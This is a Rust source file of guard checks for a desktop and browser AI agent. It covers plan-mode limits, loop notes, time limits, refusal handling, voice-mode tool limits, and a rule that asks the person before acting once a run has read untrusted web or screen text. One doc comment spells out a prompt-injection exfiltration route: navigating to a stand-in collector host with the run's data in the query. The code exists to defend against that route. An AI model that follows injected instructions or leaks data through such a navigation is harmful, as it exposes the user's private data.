//! The checks around a call and around a run: what the plan mode and a helper run may call, a refusal that lets the run go on, a call that repeats, the time a run may take, what a run that read outside text must ask before it acts, a page that asks for a sign-in, the refusal of a tool that is not there, and the browser tools a spoken request may use (card OA3-05, move only).

use super::*;

/// The most times a "no" with words lets one run go on (card OA10-03, AG-11).
pub const MAX_DENIALS_GONE_ON_FROM: u32 = 2;

/// Does this refusal let the run go on? It does when the observation carries what the person typed with their "no" (only a refusal the host made after the person answered can), the run is a
/// coding run, `AQUA_DENY_FEEDBACK` is on, and the run has not gone on from [`MAX_DENIALS_GONE_ON_FROM`] of them already. Counts the one it lets through.
pub(crate) fn deny_feedback_lets_the_run_go_on(observation: &str, goal: &str, gone_on_from: &mut u32) -> bool {
    let allowed = crate::agent_tools::denial_carries_words(observation) && *gone_on_from < MAX_DENIALS_GONE_ON_FROM && crate::flags::is_on(&crate::flags::DENY_FEEDBACK) && super::super::run_profile::coding(goal);
    if allowed {
        *gone_on_from += 1;
    }
    allowed
}

/// Plan mode is on with `AQUA_PLAN_MODE=on`, and for a plan run. It may read and search. It may not write files or start programs.
pub(crate) fn plan_mode_on() -> bool {
    plan_run() || matches!(std::env::var("AQUA_PLAN_MODE").ok().as_deref().map(|v| v.trim().to_ascii_lowercase()).as_deref(), Some("on" | "1" | "true" | "yes"))
}

pub(crate) fn plan_mode_blocks(tool: &str) -> bool {
    plan_mode_on()
        && matches!(tool, "fs.write" | "fs.edit" | "fs.edit_lines" | "fs.patch" | "fs.delete" | "fs.move" | "fs.copy" | "term.run" | "term.start")
}

/// Does the plan mode of a plan run refuse this call? Everything that can change something does (the host knows which tools can: a tool that declares itself read-only is the only kind a plan
/// run may call), not only the names `plan_mode_blocks` lists. The host's own refusal of a run's tools (`allowed_tools`) comes first for a plan run the API started; this is the second lock.
pub(crate) fn plan_run_blocks(tool: &str) -> bool {
    plan_run() && crate::agent_tools::can_change_something(crate::agent_tools::host().map(|h| &**h), tool)
}

/// A child search may only read. It cannot write, run a program, or start another child. (Card OA11-04: the list is `agents::READ_TOOLS`, the tools the `explore` helper is held to; the host's
/// `AgentScope::Helper` and the helper's own list enforce it, and this says which they are.)
pub(crate) fn child_may_call(tool: &str) -> bool {
    crate::agents::READ_TOOLS.contains(&tool)
}

/// A page that asks for a sign-in: a password box and a log-in button. The site it is (the host of the page's address), or `None` for any other page.
pub(crate) fn login_wall_host(obs: &str) -> Option<String> {
    let lower = obs.to_ascii_lowercase();
    if !lower.contains("page content") {
        return None;
    }
    let password_box = lower.lines().any(|l| l.contains("textbox") && l.contains("password"));
    let log_in_button = lower.lines().any(|l| (l.contains("button") || l.contains("link")) && (l.contains("log in") || l.contains("sign in") || l.contains("login") || l.contains("sign-in")));
    if !(password_box && log_in_button) {
        return None;
    }
    let after = obs.split("Page URL:").nth(1)?.trim_start();
    let address = after.split_whitespace().next()?;
    let host = address.split("://").nth(1)?.split(['/', '?', '#', ':']).next()?;
    let host = host.strip_prefix("www.").unwrap_or(host);
    (!host.is_empty()).then(|| host.to_string())
}

/// Does the goal need the person's account on a site (post, comment, send, reply, like, follow, buy, book, upload, their inbox or profile) and not ask to sign in
/// or sign up itself? Only then is a sign-in page a reason to stop.
pub(crate) fn goal_needs_an_account(goal: &str) -> bool {
    let lower = goal.to_ascii_lowercase();
    let words: Vec<&str> = lower.split(|c: char| !c.is_ascii_alphanumeric()).filter(|w| !w.is_empty()).collect();
    let has = |list: &[&str]| words.iter().any(|w| list.contains(w));
    let asks_to_sign_in = has(&["login", "signin", "signup", "register"]) || ["log in", "sign in", "sign up", "create an account", "create account"].iter().any(|p| lower.contains(p));
    if asks_to_sign_in {
        return false;
    }
    has(&["post", "posts", "comment", "reply", "like", "follow", "subscribe", "message", "dm", "send", "share", "upload", "buy", "order", "book", "checkout", "inbox", "notifications", "tweet", "publish"])
        || ["my account", "my profile", "my feed", "my page", "my orders", "my cart"].iter().any(|p| lower.contains(p))
}

/// The same tool called with the same arguments three times in a row, even though each call
/// "worked": a click that changes nothing, a search repeated. The 8B model does this until the step
/// budget runs out (five identical clicks on a Google page). Waiting and scrolling are meant to repeat.
pub(super) fn repeated_call_note(steps: &[AgentStep], tool: &str, arguments: &Value) -> Option<String> {
    let lower = tool.to_ascii_lowercase();
    // A poll of a background job is meant to be made again (card OA4-03, WF-08): `stuck::judge` counts it once the job has ended.
    if ["wait", "scroll", "sleep", "snapshot", "screenshot"].iter().any(|w| lower.contains(w)) || crate::modules::coding_driver::is_polling(tool) {
        return None;
    }
    let calls: Vec<&AgentStep> = steps.iter().filter(|s| s.kind == "tool").collect();
    let last3 = calls.get(calls.len().checked_sub(3)?..)?;
    let same = last3.iter().all(|s| s.detail.get("tool").and_then(|v| v.as_str()) == Some(tool) && s.detail.get("arguments") == Some(arguments));
    same.then(|| {
        format!(
            "NOTE: you have called {tool} with the same arguments 3 times in a row and nothing new came of it. Do something different: use another tool or other arguments, or give the final answer with what you already know."
        )
    })
}

/// A tool call that keeps failing the same way: after the third identical failure, tell the model to
/// change something. The 8B model otherwise repeats the call until the step budget runs out.
pub(super) fn repeated_failure_note(steps: &[AgentStep], tool: &str, arguments: &Value) -> Option<String> {
    fn failed(obs: &str) -> bool {
        let body = obs.lines().map(str::trim).find(|l| !l.is_empty() && !l.starts_with("<untrusted")).unwrap_or("");
        body.starts_with("ERROR") || body.strip_prefix("exit code ").is_some_and(|c| c.trim() != "0")
    }
    let same: Vec<&str> = steps
        .iter()
        .filter(|s| s.kind == "tool" && s.detail.get("tool").and_then(|v| v.as_str()) == Some(tool) && s.detail.get("arguments") == Some(arguments))
        .filter_map(|s| s.detail.get("observation").and_then(|v| v.as_str()))
        .collect();
    let recent_failures = same.iter().rev().take(3).filter(|o| failed(o)).count();
    (same.len() >= 3 && recent_failures == 3).then(|| {
        format!(
            "NOTE: you have called {tool} with the same arguments {} times and it failed each time. Do not call it again the same way: read the error, change the arguments or the approach, or give a final answer that says what blocked you.",
            same.len()
        )
    })
}

/// The browser policy or the user refused this action. Retrying it another way (recovery,
/// opening the URL locally) would bypass that decision, so the agent must not.
pub(super) fn is_policy_refusal(obs: &str) -> bool {
    ["[POLICY_", "[CONFIRMATION_DENIED]", "[PERMISSION_DENIED]", "[TAB_LIMIT]", "[INVALID_ARGUMENTS]"]
        .iter()
        .any(|m| obs.contains(m))
}

/// What the user declined, from a `CONFIRMATION_DENIED` observation.
pub(super) fn declined_action(obs: &str) -> String {
    let line = obs.lines().next().unwrap_or(obs);
    let detail = line
        .split_once("did not approve: ")
        .or_else(|| line.split_once("did not allow "))
        .map(|(_, rest)| rest)
        .unwrap_or(line);
    detail
        .split(". ")
        .next()
        .unwrap_or(detail)
        .trim_end_matches('.')
        .trim()
        .to_string()
}

pub(super) fn observation_indicates_browser_outage(obs: &str) -> bool {
    ["[BROWSER_CRASHED]", "[BROWSER_NOT_RUNNING]", "[EXTENSION_NOT_CONNECTED]"]
        .iter()
        .any(|m| obs.contains(m))
}

/// How long one agent run may take from its first round to its last: a spoken request is short (the person is
/// waiting, and the model is shared), a typed or scheduled run may be long. `AQUA_AGENT_MAX_SECS` overrides both.
pub(super) fn agent_run_limit(caller: WindowsCaller) -> std::time::Duration {
    if let Some(secs) = std::env::var("AQUA_AGENT_MAX_SECS").ok().and_then(|s| s.parse::<u64>().ok()) {
        return std::time::Duration::from_secs(secs.clamp(10, 7200));
    }
    std::time::Duration::from_secs(if caller == WindowsCaller::Voice { 180 } else { 900 })
}

/// The longest the loop's own clock lets a run go for whoever asked: what a typed or scheduled request gets (a spoken one gets less, never more). The foreground turn is held to this plus a
/// short grace (`api_gateway::server::turn_max`), so that the turn's own limit is never below the clock of the run it holds (card OA4-03, UX-09).
pub fn longest_agent_run() -> std::time::Duration {
    agent_run_limit(WindowsCaller::Agent)
}

/// What the person is told when a run used its time without finishing: which limit it was, and for a person who types, the setting that changes it (card OA4-03, UX-09).
/// A spoken answer is read aloud, so it names no setting.
pub(super) fn ran_out_of_time(tool_rounds: u32, limit: std::time::Duration, caller: WindowsCaller) -> String {
    let secs = limit.as_secs();
    let limit_words = if caller == WindowsCaller::Voice { format!("the {secs} seconds a spoken request gets") } else { format!("the {secs} seconds a run gets (AQUA_AGENT_MAX_SECS sets it, up to 7200)") };
    if tool_rounds > 0 {
        format!("I ran out of time ({limit_words}) before I finished, so I can't tell you it was done. Please check, or ask me again.")
    } else {
        format!("I ran out of time ({limit_words}) before I could do anything. Nothing was changed.")
    }
}

/// What a spoken request is told when the task needs a click or typing.
pub(super) const VOICE_CANNOT_ACT: &str = "I can't do that by voice. It would need me to click or type, and that has to be done from the app. Nothing was changed.";

/// Does this call change something (click, type, press a key, choose, upload, run script, open or close a tab, or any
/// desktop action other than looking)? Reading and moving to another page do not count.
pub(crate) fn acts_on_the_world(source: &str, tool: &str, arguments: &Value) -> bool {
    match source {
        // The name is read the way the dispatch reads it (without regard to case): `Browser_Click` is `browser_click`.
        "browser" => match tool.to_ascii_lowercase().as_str() {
            "browser_click" | "browser_type" | "browser_fill_form" | "browser_select_option" | "browser_press_key" | "browser_handle_dialog"
            | "browser_close" | "browser_evaluate" | "browser_file_upload" | "browser_drag" | "browser_run_code_unsafe" => true,
            "browser_tabs" => !arguments.get("action").and_then(|a| a.as_str()).is_some_and(|a| a.trim().eq_ignore_ascii_case("list")),
            _ => false,
        },
        // A drag (`Move` with `drag`) is an action even though `Move` otherwise only looks.
        "windows" => !aqua_mcp_adapters::windows_mcp::guard::is_observe_call(tool, arguments),
        _ => false,
    }
}

/// A short description of an action for the question (what and where, never the typed text).
fn describe_action(tool: &str, arguments: &Value) -> String {
    let mut parts = vec![tool.to_string()];
    for key in ["element", "target", "key", "action", "name", "label", "app", "url"] {
        if let Some(v) = arguments.get(key).and_then(|v| v.as_str()).filter(|v| !v.is_empty()) {
            parts.push(format!("{key}={}", v.chars().take(60).collect::<String>()));
        }
    }
    parts.join(" ")
}

/// This run has read untrusted text (a page, a window), which may contain instructions aimed at the assistant. So
/// before it acts it asks the person, every time, and nothing they approved earlier in the session counts. `None`
/// means go ahead; `Some` is the observation to hand back instead.
/// Is this the opening of a page that only full access lets through unasked (a site nobody listed), and that neither the person nor a search of this run named? After
/// outside text was read, that is how data leaves with no click: `browser_navigate https://collector.example/?d=<what the run knows>`. It counts as acting, so it asks.
/// (Without full access the site prompt asks about an unlisted site anyway: it is not asked twice.)
pub(crate) fn navigation_after_taint_is_acting(policy: &aqua_mcp_adapters::browser::BrowserPolicyConfig, full_access: bool, named: bool, tool: &str, arguments: &Value) -> bool {
    // `local_open_url` is the same opening by another door: it starts the person's own browser on the address.
    // Read the way the dispatch reads it, without regard to case: `Browser_Navigate` and `LOCAL_OPEN_URL` are the tools of those names.
    let tool = tool.to_ascii_lowercase();
    let new_tab = arguments.get("action").and_then(|a| a.as_str()).is_some_and(|a| a.trim().eq_ignore_ascii_case("new"));
    let opens = tool == "browser_navigate" || tool == "local_open_url" || (tool == "browser_tabs" && new_tab);
    let url = arguments.get("url").and_then(|v| v.as_str()).unwrap_or("");
    // An address nobody listed that opens with no question, whether full access or the person's denylist mode lets it (card R6-08: asked in every site mode).
    opens && !url.is_empty() && !named && policy.opens_unlisted_without_a_question(url, full_access)
}

/// Does a run that has read outside text have to be asked before this call (card R6-08)? It is the old route's rule and nothing else, as a function of what it reads, so that the
/// one-door table can ask it: a call that acts on the world, or opens an address nobody listed that neither the person nor a search named. `policy` and `named` are only
/// worked out when the call is a browser one that opens something.
pub(crate) fn taint_asks(tainted: bool, source: &str, tool: &str, arguments: &Value, policy: impl FnOnce() -> Option<aqua_mcp_adapters::browser::BrowserPolicyConfig>, full_access: bool, named: impl FnOnce() -> bool) -> bool {
    let opens_an_unlisted_site = tainted && source == "browser" && policy().is_some_and(|p| navigation_after_taint_is_acting(&p, full_access, named(), tool, arguments));
    tainted && (acts_on_the_world(source, tool, arguments) || opens_an_unlisted_site)
}

pub(crate) fn ask_before_acting_when_tainted(browser: &Option<BrowserHandle>, tainted: bool, source: &str, tool: &str, arguments: &Value) -> Option<String> {
    // Every browser and desktop call passes here first: the one-door comparison counts the questions the old route puts from this point on (card R6-08).
    crate::door_shadow::note_old_route_call_begins();
    let named = || {
        let url = arguments.get("url").and_then(|v| v.as_str()).unwrap_or("");
        let run = crate::agent_runs::scope::current_run();
        // What the person typed is theirs; for a spoken request only a result of its own search is named (a television can say an address).
        if windows_caller_now() == WindowsCaller::Voice { crate::sources::named_by_a_search(&run, url) } else { crate::sources::may_read(&run, url) }
    };
    if !taint_asks(tainted, source, tool, arguments, || browser.as_ref().map(|b| b.policy()), aqua_mcp_adapters::full_access::is_on(), named) {
        return None;
    }
    let what = describe_action(tool, arguments);
    let Some(b) = browser.as_ref() else {
        return Some(format!("ERROR [CONFIRMATION_DENIED] {tool}: there is no way to ask you, and this run has read web or window content, so you did not approve: {what}."));
    };
    let policy = b.policy();
    let private = crate::agent_runs::scope::run_marks(&crate::agent_runs::scope::current_run()).is_some_and(|(_, private)| private);
    // The question says what the host's questions say (card R6-08, T6-08.8): what the call can do, what could go wrong, which rule asked, and what the run has read and holds.
    let (classes, why) = tainted_question(source, tool, arguments, Some(&policy), private);
    let (_, decision) = b.broker().request_explained(
        aqua_mcp_adapters::browser::ConfirmKind::Action,
        tool,
        format!("This run has read content from the web or your screen, which can contain instructions meant for the assistant. Allow it to {what}?"),
        None,
        None,
        // Nothing they approved earlier counts, so the question does not offer "for this session".
        true,
        classes,
        why,
        std::time::Duration::from_secs(policy.confirm_timeout_secs),
    );
    match decision {
        aqua_mcp_adapters::browser::Decision::Deny => Some(format!("ERROR [CONFIRMATION_DENIED] {tool}: you did not approve: {what}.")),
        _ => None,
    }
}

/// What the question "this run has read outside text; may it do this?" shows besides the action (card R6-08, T6-08.8), built the way the host builds the question it puts for a
/// call of its own: the classes of the call, what could go wrong, the rule that made it ask, what is involved, that the run has read outside text, and that it holds the person's
/// data when it does.
pub(crate) fn tainted_question(source: &str, tool: &str, arguments: &Value, policy: Option<&aqua_mcp_adapters::browser::BrowserPolicyConfig>, private: bool) -> (Vec<String>, aqua_mcp_adapters::browser::ConfirmWhy) {
    use aqua_tool_host::PermClass;
    let by_the_providers_rule = match (source, policy) {
        ("browser", Some(p)) => aqua_mcp_adapters::browser::BrowserProvider::classes_of_wire_call(tool, arguments, p, aqua_mcp_adapters::full_access::is_on()),
        _ => None,
    };
    let classes = by_the_providers_rule.unwrap_or_else(|| match (source, tool) {
        // The person's own browser, opened on an address.
        (_, "local_open_url") => vec![PermClass::Network],
        ("browser", _) => vec![PermClass::Network, PermClass::Write],
        _ => vec![PermClass::Write],
    });
    // The address is named by its origin and path (a query can carry a token); anything else by the tool.
    let target = arguments.get("url").and_then(|v| v.as_str()).filter(|u| !u.is_empty()).map(aqua_mcp_adapters::browser::audit::reduce_url).unwrap_or_else(|| tool.to_string());
    let rule = "This run has read content from the web or your screen, which can contain instructions meant for the assistant: Aqua asks before it acts, every time.";
    (aqua_mcp_adapters::browser::confirm::class_words(&classes), aqua_mcp_adapters::browser::confirm::explained(&classes, &target, rule, true, private))
}

/// The browser tools a voice request may use: they only read, or move to another page (which the site policy
/// still checks). Anything that clicks, types, presses a key, picks an option, answers a dialog, closes the page,
/// uploads a file or runs script is refused for voice. A tab listing is a read; opening or closing tabs is not.
pub(crate) fn voice_may_use_browser_tool(tool: &str, arguments: &Value) -> bool {
    match tool {
        // Voice may go to another page, but not to a service on this computer or its network (`localhost` is on the
        // default allow list, so the site policy alone would let a spoken request read any of them).
        "browser_navigate" => !arguments.get("url").and_then(|u| u.as_str()).is_some_and(aqua_mcp_adapters::browser::url_targets_local_machine),
        "browser_navigate_back" | "browser_go_back" | "browser_go_forward" | "browser_snapshot" | "browser_find"
        | "aqua_browser_extract" | "browser_take_screenshot" | "browser_screenshot" | "browser_console_messages"
        | "browser_get_console_logs" | "browser_wait_for" | "browser_wait" | "aqua_browser_session" => true,
        "browser_tabs" => arguments.get("action").and_then(|a| a.as_str()) == Some("list"),
        _ => false,
    }
}

/// A call that was running when Aqua stopped, repeated in the run that goes on from it, on a route the host does not decide for: it is not run again without the
/// person (the host's own tools ask; these have no such question, so the run is told what to do instead).
pub(super) fn unknown_repeat_refusal(announced: &str, tool: &str, arguments: &Value) -> Option<(String, String)> {
    let h = crate::agent_tools::host()?;
    let run = crate::agent_runs::scope::current_run();
    (crate::agent_tools::can_change_something(Some(h), tool) && (h.is_unknown_repeat(&run, announced, arguments) || h.is_unknown_repeat(&run, tool, arguments))).then(|| {
        ("guard".to_string(), format!("ERROR [NEEDS_USER_CHOICE] {tool}: this exact call was running when Aqua stopped, so it may already have happened. Do not repeat it. Check the state first, or give the final answer saying this needs the person's decision."))
    })
}

/// Does an `App` call launch a browser (by its name: Chrome, Edge, Firefox, Brave, Opera)?
pub(super) fn launches_a_browser(arguments: &Value) -> bool {
    let name = arguments.get("name").or_else(|| arguments.get("app")).and_then(|v| v.as_str()).unwrap_or("").to_ascii_lowercase();
    let launching = arguments.get("mode").and_then(|v| v.as_str()).map_or(true, |m| m.eq_ignore_ascii_case("launch"));
    launching && ["chrome", "edge", "msedge", "firefox", "brave", "opera", "vivaldi"].iter().any(|b| name.contains(b))
}

/// May a browser call's own arguments choose the browser? Not once the run has read untrusted content.
pub(super) fn a_call_may_choose_the_browser(run_is_tainted: bool) -> bool {
    !run_is_tainted
}

/// The browser the planner named in a browser call's arguments, taken out of them: `(the arguments without it, its name)`.
pub(super) fn take_browser_name(mut arguments: Value) -> (Value, Option<String>) {
    let named = arguments.as_object_mut().and_then(|o| o.remove("browser")).and_then(|v| v.as_str().map(|s| s.trim().to_string())).filter(|s| !s.is_empty());
    (arguments, named)
}

/// The guard refuses shell, file, registry, process, scrape and clipboard tools by name. Asking for
/// one is a planning mistake (often an old habit), not a decision by the user or the policy to
/// respect, so the run should not end: say there is no such tool and point at what to use instead.
pub(super) fn explain_missing_tool(tool: &str, obs: String) -> String {
    if !obs.contains("is not available: Aqua does not give the agent") {
        return obs;
    }
    format!(
        "ERROR [INVALID_ARGUMENTS] {tool}: there is no {tool} tool. Do not call it again. \
         For a web page or live facts (weather, news, prices) use browser_navigate and then aqua_browser_extract; \
         for a desktop app use App, Click, Type and Snapshot; for files, commands or git use the [host] tools when they are listed."
    )
}
